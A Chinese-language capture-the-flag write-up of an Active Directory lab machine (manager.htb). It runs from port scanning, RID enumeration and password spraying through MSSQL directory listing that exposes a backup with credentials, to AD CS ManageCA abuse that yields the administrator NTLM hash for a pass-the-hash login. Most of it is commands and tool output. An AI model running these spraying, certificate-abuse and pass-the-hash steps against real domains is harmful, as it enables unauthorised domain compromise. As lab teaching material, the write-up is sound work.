		首先通过RID来枚举有效用户，有了用户名后考虑使用用户名来生成密码字典，比如纯小写、纯大写。然后进行密码喷洒能得到一个有效凭证。然后发现该凭证能够登录mssql。连接上mssql后发现无法执行xp_cmdshell模块，但是可以利用xp_dirtree模块来枚举模板机器上的目录。最终发现了一个备份文件，在这个文件中找到了一组凭证，用它获取了初始立足点。之后进行AD枚举，发现了AC DS上的raven用户具备manage ca权限，滥用该权限来获取administrator用户的ntlm哈希。



# 01、基础信息收集

## 1.1 端口信息枚举

1. 枚举所有开放的tcp端口

   ```
   └─# nmap -sS -Pn -p- 10.10.11.236 --min-rate 1000
   Nmap scan report for 10.10.11.236
   Host is up (0.56s latency).
   Not shown: 65513 filtered tcp ports (no-response)
   PORT      STATE SERVICE
   53/tcp    open  domain
   80/tcp    open  http
   88/tcp    open  kerberos-sec
   135/tcp   open  msrpc
   139/tcp   open  netbios-ssn
   389/tcp   open  ldap
   445/tcp   open  microsoft-ds
   464/tcp   open  kpasswd5
   593/tcp   open  http-rpc-epmap
   636/tcp   open  ldapssl
   1433/tcp  open  ms-sql-s
   3268/tcp  open  globalcatLDAP
   3269/tcp  open  globalcatLDAPssl
   5985/tcp  open  wsman
   9389/tcp  open  adws
   49668/tcp open  unknown
   49683/tcp open  unknown
   49684/tcp open  unknown
   49685/tcp open  unknown
   49722/tcp open  unknown
   51118/tcp open  unknown
   51160/tcp open  unknown
   ```

2. 枚举所有开放的udp端口

   ```
   └─# nmap -sU -Pn -p- 10.10.11.236 --min-rate 10000      
   PORT    STATE SERVICE
   123/udp open  ntp
   ```

3. 枚举所有开放端口的详细信息

   ```
   提取所有的端口号
   └─# cat port| cut -d '/' -f 1 | tr '\n' ','   
   53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49668,49683,49684,49685,49722,51118,51160,
   
   └─# nmap -sV -sC -Pn -O -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49668,49683,49684,49685,49722,51118,51160 10.10.11.236 --min-rate 10000
   PORT      STATE    SERVICE       VERSION
   53/tcp    open     domain        Simple DNS Plus
   80/tcp    open     http          Microsoft IIS httpd 10.0
   88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-22 17:23:04Z)
   135/tcp   open     msrpc         Microsoft Windows RPC
   139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
   389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
   | ssl-cert: Subject: commonName=dc01.manager.htb
   | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
   | Not valid before: 2023-07-30T13:51:28
   |_Not valid after:  2024-07-29T13:51:28
   |_ssl-date: 2023-10-22T17:25:35+00:00; +7h00m00s from scanner time.
   445/tcp   open     microsoft-ds?
   464/tcp   open     kpasswd5?
   593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
   636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
   | ssl-cert: Subject: commonName=dc01.manager.htb
   | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
   | Not valid before: 2023-07-30T13:51:28
   |_Not valid after:  2024-07-29T13:51:28
   |_ssl-date: 2023-10-22T17:25:27+00:00; +6h59m57s from scanner time.
   1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
   |_ssl-date: 2023-10-22T17:25:39+00:00; +7h00m00s from scanner time.
   | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
   | Not valid before: 2023-10-22T17:05:12
   |_Not valid after:  2053-10-22T17:05:12
   |_ms-sql-info: ERROR: Script execution failed (use -d to debug)
   |_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
   3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
   |_ssl-date: 2023-10-22T17:25:39+00:00; +7h00m00s from scanner time.
   | ssl-cert: Subject: commonName=dc01.manager.htb
   | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
   | Not valid before: 2023-07-30T13:51:28
   |_Not valid after:  2024-07-29T13:51:28
   3269/tcp  open     ssl/ldap
   | ssl-cert: Subject: commonName=dc01.manager.htb
   | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
   | Not valid before: 2023-07-30T13:51:28
   |_Not valid after:  2024-07-29T13:51:28
   5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
   |_http-server-header: Microsoft-HTTPAPI/2.0
   |_http-title: Not Found
   9389/tcp  open     mc-nmf        .NET Message Framing
   49668/tcp open     unknown
   49683/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
   49684/tcp open     unknown
   49685/tcp open     unknown
   49722/tcp open     unknown
   51118/tcp open     msrpc         Microsoft Windows RPC
   51160/tcp filtered unknown
   Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
   OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
   No OS matches for host
   Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
   
   Host script results:
   |_clock-skew: mean: 6h59m59s, deviation: 1s, median: 6h59m59s
   | smb2-security-mode: 
   |   311: 
   |_    Message signing enabled and required
   | smb2-time: 
   |   date: 2023-10-22T17:24:42
   |_  start_date: N/A
   
   ```

   从枚举到的信息来看，这是一台windows机器，目标机器是一台域控制器，域名是manager.htb。现在/etc/hosts中添加`10.10.11.236 manager.htb `



## 1.2 端口服务枚举

### 1.2.1 TCP 53 DNS

1. 目标机器的域名是manager.htb，对它进行区域传输，没有找到其他子域名

   ```
   └─# dig axfr @10.10.11.236 manager.htb
   
   ; <<>> DiG 9.19.17-1-Debian <<>> axfr @10.10.11.236 manager.htb
   ; (1 server found)
   ;; global options: +cmd
   ; Transfer failed.
   ```

2. 枚举一下虚拟主机名，这几个子域名，但是这些域名得到的web服务没有改变，这边也就不继续探测子域名了。

   ```
   └─# wfuzz -u http://10.10.11.236 -H "Host: FUZZ.manager.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
    /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
   ********************************************************
   * Wfuzz 3.1.0 - The Web Fuzzer                         *
   ********************************************************
   
   Target: http://10.10.11.236/
   Total requests: 19966
   
   =====================================================================
   ID           Response   Lines    Word       Chars       Payload                                            
   =====================================================================
   
   000000030:   200        506 L    1356 W     18203 Ch    "new"                                              
   000000007:   200        506 L    1356 W     18203 Ch    "webdisk"     
   ```



### 1.2.2 TCP 80 HTTP

1. 是一个静态站点，没有找到有趣的内容。
2. 暂时没有找到有趣的web子目录



### 1.2.3 TCP 389 LDAP

1. 尝试利用空凭证提取域中的信息，没有找到有用的信息

   ```
   └─# ldapsearch -x -H ldap://10.10.11.236 -D "" -w "" -b "DC=MANAGER,DC=HTB" > ldap.txt
   # extended LDIF
   #
   # LDAPv3
   # base <DC=MANAGER,DC=LOCAL> with scope subtree
   # filter: (objectclass=*)
   # requesting: ALL
   #
   
   # search result
   search: 2
   result: 1 Operations error
   text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
    tion a successful bind must be completed on the connection., data 0, v4563
   
   # numResponses: 1
   ```

   

### 1.2.4 TCP 139/445 smb

1. 可以无凭证列出一些smb上的共享文件

   ```
   └─# smbclient --no-pass -L 10.10.11.236                                               
   
           Sharename       Type      Comment
           ---------       ----      -------
           ADMIN$          Disk      Remote Admin
           C$              Disk      Default share
           IPC$            IPC       Remote IPC
           NETLOGON        Disk      Logon server share 
           SYSVOL          Disk      Logon server share 
   Reconnecting with SMB1 for workgroup listing.
   do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
   Unable to connect with SMB1 -- no workgroup available
   
   ```

2. 尝试递归枚举一下共享文件夹中的内容，但是发现匿名用户没有权限。如果我们拥有有效凭证的话在来枚举smb。



### 1.2.5 TCP 1433 MSSQL

​		tcp 1433口的mssql非常值得探索，如果我们能够获取mssql的高权限账户，那么我们就能够获取shell。如果我找到了一些凭证后会回来尝试连接mssql。



## 1.3 RID枚举用户

1. 利用Kerberos 身份验证来枚举一下用户名，但是没有找到额外的用户。

   ```
   └─# kerbrute userenum /usr/share/seclists/Usernames/top-usernames-shortlist.txt  --dc 10.10.11.236 -d manager.htb 
   
       __             __               __     
      / /_____  _____/ /_  _______  __/ /____ 
     / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
    / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
   /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
   
   Version: v1.0.3 (9dad6e1) - 10/22/23 - Ronnie Flathers @ropnop
   
   2023/10/22 07:31:16 >  Using KDC(s):
   2023/10/22 07:31:16 >   10.10.11.236:88
   
   2023/10/22 07:31:16 >  [+] VALID USERNAME:       administrator@manager.htb
   2023/10/22 07:31:22 >  [+] VALID USERNAME:       guest@manager.htb
   2023/10/22 07:31:54 >  Done! Tested 17 usernames (2 valid) in 38.129 seconds
   
   ```

2. 通过暴力破解远程目标上的 RID 来枚举用户

   ```
   └─# nxc smb manager.htb -u anonymous  -p '' --rid-brute
   SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
   SMB         10.10.11.236    445    DC01             [+] manager.htb\anonymous: 
   SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
   SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
   SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
   SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
   SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
   SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
   SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
   SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
   SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
   SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
   SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
   SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
   SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
   SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
   SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
   SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
   SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
   SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
   
   ```

   在Windows域环境中，RID 500通常分配给内置的管理员帐户（Administrator），RID 1000分配给第一个创建的普通用户帐户。通过rid枚举，我们获取了的有效用户名如下

   ```
   MANAGER\Administrator
   MANAGER\Guest
   MANAGER\krbtgt
   MANAGER\DC01$
   MANAGER\Zhong
   MANAGER\Cheng
   MANAGER\Ryan
   MANAGER\Raven
   MANAGER\JinWoo
   MANAGER\ChinHae
   MANAGER\Operator
   ```

3. 进行Kerberos 身份验证来验证这些用户名有效

   ```
   └─# kerbrute userenum users --dc 10.10.11.236 -d manager.htb
   
       __             __               __     
      / /_____  _____/ /_  _______  __/ /____ 
     / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
    / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
   /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
   
   Version: v1.0.3 (9dad6e1) - 10/22/23 - Ronnie Flathers @ropnop
   
   2023/10/22 08:26:32 >  Using KDC(s):
   2023/10/22 08:26:32 >   10.10.11.236:88
   
   2023/10/22 08:26:32 >  [+] VALID USERNAME:       Administrator@manager.htb
   2023/10/22 08:26:32 >  [+] VALID USERNAME:       DC01$@manager.htb
   2023/10/22 08:26:32 >  [+] VALID USERNAME:       Zhong@manager.htb
   2023/10/22 08:26:32 >  [+] VALID USERNAME:       Guest@manager.htb
   2023/10/22 08:26:32 >  [+] VALID USERNAME:       Cheng@manager.htb
   2023/10/22 08:26:33 >  [+] VALID USERNAME:       Raven@manager.htb
   2023/10/22 08:26:33 >  [+] VALID USERNAME:       Ryan@manager.htb
   2023/10/22 08:26:33 >  [+] VALID USERNAME:       ChinHae@manager.htb
   2023/10/22 08:26:33 >  [+] VALID USERNAME:       JinWoo@manager.htb
   2023/10/22 08:26:33 >  [+] VALID USERNAME:       Operator@manager.htb
   2023/10/22 08:26:33 >  Done! Tested 11 usernames (10 valid) in 0.874 seconds
   ```

4. 有了有效用户名之后我们来尝试制作这些用户名的字典，以用户名和密码重复为例。

   ```
   └─# nxc smb manager.htb -u users -p passwd --no-bruteforce --continue-on-success
   SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Administrator:Administrator STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Zhong:Zhong STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Cheng:Cheng STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Ryan:Ryan STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Raven:Raven STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\JinWoo:JinWoo STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\ChinHae:ChinHae STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Operator:Operator STATUS_LOGON_FAILURE 
   ```

   没用找到有效凭证，在尝试密码部分全小写和全大写测试。

   ```
   #一个简单的小脚本帮助实现全大写或全小写
   全小写
   #!/usr/bin/python3
   
   f = open('users', 'r')
   r = open('users_lower','w')
   
   users = f.read()
   
   print(users.lower())
   r.write(users.lower())
   
   f.close()
   r.close()
   
   全大写
   #!/usr/bin/python3
   
   f = open('users', 'r')
   r = open('users_upper','w')
   
   #users = ''.join(f)
   users = f.read()
   
   print(users.upper())
   r.write(users.upper())
   
   f.close()
   r.close()
   ```

   再次尝试，得到了一组有效的smb凭证 `Operator:operator`

   ```
   └─# nxc smb manager.htb -u users -p users_lower --no-bruteforce --continue-on-success 
   SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Administrator:administrator STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Zhong:zhong STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Cheng:cheng STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Ryan:ryan STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\Raven:raven STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\JinWoo:jinwoo STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [-] manager.htb\ChinHae:chinhae STATUS_LOGON_FAILURE 
   SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator 
   ```



# 02、获取初始立足点

## 2.1、 MSSQL枚举

1. 首先`Operator:operator`无法通过TCP 5985的winrm登录，smb下也找不到有趣的信息，但是发现该凭证可以登录mssql

   ```
   └─# nxc mssql manager.htb -u Operator -p operator
   MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
   MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\Operator:operator 
   ```

2. 使用impacket-mssqlclient登录

   ```
   └─# impacket-mssqlclient 'manager.htb/Operator:operator@10.10.11.236' -windows-auth -dc-ip 10.10.11.236
   Impacket v0.11.0 - Copyright 2023 Fortra
   
   [*] Encryption required, switching to TLS
   [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
   [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
   [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
   [*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
   [*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
   [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
   [!] Press help for extra shell commands
   SQL (MANAGER\Operator  guest@master)> 
   
   ```

   但是很可惜，我们没用权限启动xp_cmdshell

   ```
   SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
   [-] ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
   [-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
   [-] ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
   [-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
   ```

3. 使用help查看一下当前我们可以执行的操作，

   ```
   SQL (MANAGER\Operator  guest@master)> help
   
       lcd {path}                 - changes the current local directory to {path}
       exit                       - terminates the server process (and this session)
       enable_xp_cmdshell         - you know what it means
       disable_xp_cmdshell        - you know what it means
       enum_db                    - enum databases
       enum_links                 - enum linked servers
       enum_impersonate           - check logins that can be impersonate
       enum_logins                - enum login users
       enum_users                 - enum current db users
       enum_owner                 - enum db owner
       exec_as_user {user}        - impersonate with execute as user
       exec_as_login {login}      - impersonate with execute as login
       xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
       xp_dirtree {path}          - executes xp_dirtree on the path
       sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
       use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
       ! {cmd}                    - executes a local shell cmd
       show_query                 - show query
       mask_query                 - mask query
   ```

   发现可以使用`xp_dirtree` 来枚举目录。结果一番手动枚举，发现了web目录下有一个站点备份文件

   ```
   SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
   [%] exec master.sys.xp_dirtree 'C:\inetpub\wwwroot',1,1
   subdirectory                      depth   file   
   -------------------------------   -----   ----   
   about.html                            1      1   
   
   contact.html                          1      1   
   
   css                                   1      0   
   
   images                                1      0   
   
   index.html                            1      1   
   
   js                                    1      0   
   
   service.html                          1      1   
   
   web.config                            1      1   
   
   website-backup-27-07-23-old.zip       1      1   
   
   ```

4. 下载web站点备份文件，然后检索，在`.old-conf.xml`中发现了一组凭证  `raven:R4v3nBe5tD3veloP3r!123`

   ```
   <?xml version="1.0" encoding="UTF-8"?>
   <ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <server>
         <host>dc01.manager.htb</host>
         <open-port enabled="true">389</open-port>
         <secure-port enabled="false">0</secure-port>
         <search-base>dc=manager,dc=htb</search-base>
         <server-type>microsoft</server-type>
         <access-user>
            <user>raven@manager.htb</user>
            <password>R4v3nBe5tD3veloP3r!123</password>
         </access-user>
         <uid-attribute>cn</uid-attribute>
      </server>
      <search type="full">
         <dir-list>
            <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
         </dir-list>
      </search>
   </ldap-conf>
   ```

   该凭证可以通过winrm登录目标机器

   ```
   └─# nxc winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
   SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
   HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
   HTTP        10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
   
   ```



## 2.3、获取初始立足点

1. 使用evil-winrm连接上目标机器。

   ```
   └─# evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'    
                                           
   Evil-WinRM shell v3.5
                                           
   Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                           
   Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                           
   Info: Establishing connection to remote endpoint
   *Evil-WinRM* PS C:\Users\Raven\Documents> whoami
   manager\raven
   ```




# 03、本地特权提升

## 3.1 AD枚举

1. 使用Winpeasany.exe进行了简单的枚举，没用找到有用的信息。由于这是域控，因此我将精力放在了收集域内信息上。

2. 使用bloodhound来收集一下域内的信息。但是并没有找到有用的信息。

   ```
   *Evil-WinRM* PS C:\Users\> .\SharpHound.exe -c all
   ```

3. 没用收集到有用的域内信息，尝试枚举AD服务

   

## 3.2 AD CS利用

1. 使用Certify.exe查找易受攻击的证书模板，发现Raven用户具备 ManageCA, Enroll权限

   ```
   *Evil-WinRM* PS C:\Users\Raven\Documents> .\Certify.exe find /vulnerable /currentuser
   
      _____          _   _  __
     / ____|        | | (_)/ _|
    | |     ___ _ __| |_ _| |_ _   _
    | |    / _ \ '__| __| |  _| | | |
    | |___|  __/ |  | |_| | | | |_| |
     \_____\___|_|   \__|_|_|  \__, |
                                __/ |
                               |___./
     v1.0.0
   
   [*] Action: Find certificate templates
   [*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'
   
   [*] Listing info about the Enterprise CA 'manager-DC01-CA'
   
       Enterprise CA Name            : manager-DC01-CA
       DNS Hostname                  : dc01.manager.htb
       FullName                      : dc01.manager.htb\manager-DC01-CA
       Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
       Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
       Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
       Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
       Cert Start Date               : 7/27/2023 3:21:05 AM
       Cert End Date                 : 7/27/2122 3:31:04 AM
       Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
       UserSpecifiedSAN              : Disabled
       CA Permissions                :
         Owner: BUILTIN\Administrators        S-1-5-32-544
   
         Access Rights                                     Principal
   
         Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
         Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
         Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
         Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
         Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
         Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
           [!] Current user (or a group they are a member of) has ManageCA rights!
         Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
       Enrollment Agent Restrictions : None
   
   ```
   
2. [ManageCA权限滥用](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2)

   通过将您的用户添加为新主管来授予自己 `Manage Certificates` 访问权限。

   ```
   └─# certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
   Certipy v4.8.2 - by Oliver Lyak (ly4k)
   
   [*] Successfully added officer 'Raven' on 'manager-DC01-CA'
   ```

   使用 `-enable-template` 参数在 CA 上启用 `SubCA` 模板。默认情况下， `SubCA` 模板已启用。

   ```
   # List templates
   └─# certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -enable-template 'SubCA'  
   ## If SubCA is not there, you need to enable it
   
   # Enable SubCA
   certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
   
   #正确响应
   Certipy v4.0.0 - by Oliver Lyak (ly4k)
   
   [*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
   ```

   

3. 如果我们已经满足了此攻击的先决条件，我们可以首先请求基于 `SubCA` 模板的证书。

   该请求将被拒绝，但我们将保存私钥并记下请求 ID。此处是63

   ```
   └─# certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target 10.10.11.236 -template SubCA -upn administrator@manager.htb
   Certipy v4.8.2 - by Oliver Lyak (ly4k)
   
   [*] Requesting certificate via RPC
   [-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
   [*] Request ID is 63
   Would you like to save the private key? (y/N) y
   [*] Saved private key to 63.key
   [-] Failed to request certificate
   ```

4. 通过 `Manage CA` 和 `Manage Certificates` ，我们可以使用 `ca` 命令和 `-issue-request <request ID>` 参数发出失败的证书请求。

   ```
   └─# certipy ca -ca 'manager-DC01-CA' -issue-request 63 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
   Certipy v4.8.2 - by Oliver Lyak (ly4k)
   
   [*] Successfully issued certificate
   
   ```

   ps:如果证书请求失败，多半是由于`Manage Certificates`权限没用赋予成功，重新执行赋予该权限的利用命令



5. 最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数检索颁发的证书。

   ```
   └─# certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target 10.10.11.236 -retrieve 63
   
   Certipy v4.8.2 - by Oliver Lyak (ly4k)
   
   [*] Rerieving certificate with ID 63
   [*] Successfully retrieved certificate
   [*] Got certificate with UPN 'administrator@manager.htb'
   [*] Certificate has no object SID
   [*] Loaded private key from '63.key'
   [*] Saved certificate and private key to 'administrator.pfx'
   
   ```

6. 现在我们拥有了颁布给administrator用户的证书，利用他来伪造administrator的身份与AD CS进行身份验证。

   ```
   └─# certipy auth -pfx 'administrator.pfx' -username 'administrator'  -dc-ip 10.10.11.236  
   Certipy v4.8.2 - by Oliver Lyak (ly4k)
   
   [*] Using principal: administrator@manager.htb
   [*] Trying to get TGT...
   [-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
   
   上述报错是由于进行kerberos身份验证的时候与DC的时间差太大。同步一下时间即可。
   └─# timedatectl set-ntp 0    #timedatectl这个东西会检测你当前地区自动更新时间，0表示停止这个服务 1表示开启
   └─# rdate -n 10.10.11.236
   
   └─# certipy auth -pfx 'administrator.pfx' -username 'administrator'  -dc-ip 10.10.11.236
   Certipy v4.8.2 - by Oliver Lyak (ly4k)
   
   [*] Using principal: administrator@manager.htb
   [*] Trying to get TGT...
   [*] Got TGT
   [*] Saved credential cache to 'administrator.ccache'
   [*] Trying to retrieve NT hash for 'administrator'
   [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
   ```

7. 现在我们获取了administrator的ntlm哈希，利用该hash登录DC

   ```
   └─# evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
                                           
   Evil-WinRM shell v3.5
                                           
   Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
                                           
   Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                           
   Info: Establishing connection to remote endpoint
   *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
   manager\administrator
   ```

   

